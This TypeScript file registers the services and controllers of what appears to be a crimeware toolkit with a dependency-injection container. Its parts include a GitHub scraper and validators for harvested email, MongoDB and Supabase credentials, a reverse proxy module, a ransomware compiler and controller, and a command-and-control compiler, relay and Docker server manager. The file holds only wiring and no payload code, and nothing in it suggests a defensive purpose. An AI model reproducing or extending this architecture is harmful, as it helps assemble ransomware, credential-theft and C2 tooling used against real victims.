import { Container, TOKENS } from "../shared/Container.js";
import { GitHubScraper }             from "./adapters/scraping/GitHubScrapper.js";
import { EmailValidatorService }     from "./adapters/credential/EmailValidatorService.js";
import { MongoValidatorService }     from "./adapters/credential/MongoValidatorService.js";
import { SupabaseValidatorService }  from "./adapters/credential/SupabaseValidatorService.js";
import { DockerProxyManagerService } from "./adapters/proxy/DockerProxyManagerService.js";
import { ImapListenerService }       from "./adapters/monitoring/ImapListenerService.js";
import { EmailMonitorService }       from "./adapters/monitoring/EmailMonitorService.js";
import { ImapFlowClient }            from "./adapters/email/ImapFlowClient.js";
import { NodemailerEmailSender }     from "./adapters/email/NodemailerEmailSender.js";
import { NodeFileStorage }           from "./adapters/storage/NodeFileStorage.js";
import { PowerShellClipboard }       from "./adapters/platform/PowerShellClipboard.js";
import { KeywordFileReader }         from "./adapters/storage/KeywordFileReader.js";
import { CredentialEngineFactory }   from "./engine/CredentialEngineFactory.js";
import { ReverseProxyModuleFactory } from "./modules/ReverseProxyModuleFactory.js";
import { ChalkLogger }               from "./cross-cutting/ChalkLogger.js";
import { AppConfig }                 from "../config/app.config.js";
import { EmailController }           from "./controllers/EmailController.js";
import { MongoController }           from "./controllers/MongoController.js";
import { SupabaseController }        from "./controllers/SupabaseController.js";
import { ProxyController }           from "./controllers/ProxyController.js";
import { ProxyReverseController }    from "./controllers/ProxyReverseController.js";
import { ScraperController }         from "./controllers/ScraperController.js";
import { RansomCompilerService }     from "./adapters/ransom/RansomCompilerService.js";
import { RansomController }          from "./controllers/RansomController.js";
import { PythonWsClient }            from "./adapters/ws/PythonWsClient.js";
import { C2CompilerService }         from "./adapters/c2/C2CompilerService.js";
import { C2RelayWsClient }          from "./adapters/c2/C2RelayWsClient.js";
import { DockerC2ServerManager }     from "./adapters/c2/DockerC2ServerManager.js";
import { C2Controller }              from "./controllers/C2Controller.js";

export function addInfrastructure(container: Container): void {
  container.register(TOKENS.ILogger,                    () => new ChalkLogger(AppConfig.isDebug()));
  container.register(TOKENS.IGitHubScraper,             () => new GitHubScraper());
  container.register(TOKENS.IEmailValidator,            () => new EmailValidatorService());
  container.register(TOKENS.IMongoValidator,            () => new MongoValidatorService());
  container.register(TOKENS.ISupabaseValidator,         () => new SupabaseValidatorService());
  container.register(TOKENS.IProxyManager,              () => new DockerProxyManagerService());
  container.register(TOKENS.IImapClient,                () => new ImapFlowClient());
  container.register(TOKENS.IEmailSender,               () => new NodemailerEmailSender());
  container.register(TOKENS.IFileStorage,               () => new NodeFileStorage());
  container.register(TOKENS.IClipboard,                 () => new PowerShellClipboard());
  container.register(TOKENS.IKeywordReader,             (c) => new KeywordFileReader(c.resolve(TOKENS.IFileStorage)));
  container.register(TOKENS.ICredentialEngineFactory,   (c) => new CredentialEngineFactory(c.resolve(TOKENS.ILogger)));
  container.register(TOKENS.IReverseProxyModuleFactory, () => new ReverseProxyModuleFactory());

  container.register(TOKENS.ImapListenerFactory,        () => () => new ImapListenerService());
  container.register(TOKENS.EmailMonitorServiceFactory, () => () => new EmailMonitorService());

  container.register(TOKENS.EmailController,        (c) => new EmailController(c.resolve(TOKENS.IMediator)));
  container.register(TOKENS.MongoController,        (c) => new MongoController(c.resolve(TOKENS.IMediator)));
  container.register(TOKENS.SupabaseController,     (c) => new SupabaseController(c.resolve(TOKENS.IMediator)));
  container.register(TOKENS.ProxyController,        (c) => new ProxyController(c.resolve(TOKENS.IMediator)));
  container.register(TOKENS.ProxyReverseController, (c) => new ProxyReverseController(c.resolve(TOKENS.IMediator)));
  container.register(TOKENS.ScraperController,      (c) => new ScraperController(c.resolve(TOKENS.IMediator)));

  container.register(TOKENS.IRansomCompiler,   () => new RansomCompilerService());
  container.register(TOKENS.IPythonWsClient,   () => new PythonWsClient());
  container.register(TOKENS.RansomController,  (c) => new RansomController(
    c.resolve(TOKENS.CompileRansomUseCase),
    c.resolve(TOKENS.IPythonWsClient),
  ));

  container.register(TOKENS.IC2Compiler,       () => new C2CompilerService());
  container.register(TOKENS.IC2RelayClient,    () => new C2RelayWsClient());
  container.register(TOKENS.IC2ServerManager,  () => new DockerC2ServerManager());
  container.register(TOKENS.C2Controller, (c) => new C2Controller(
    c.resolve(TOKENS.CompileC2UseCase),
    c.resolve(TOKENS.IC2RelayClient),
    c.resolve(TOKENS.IC2ServerManager),
  ));
}

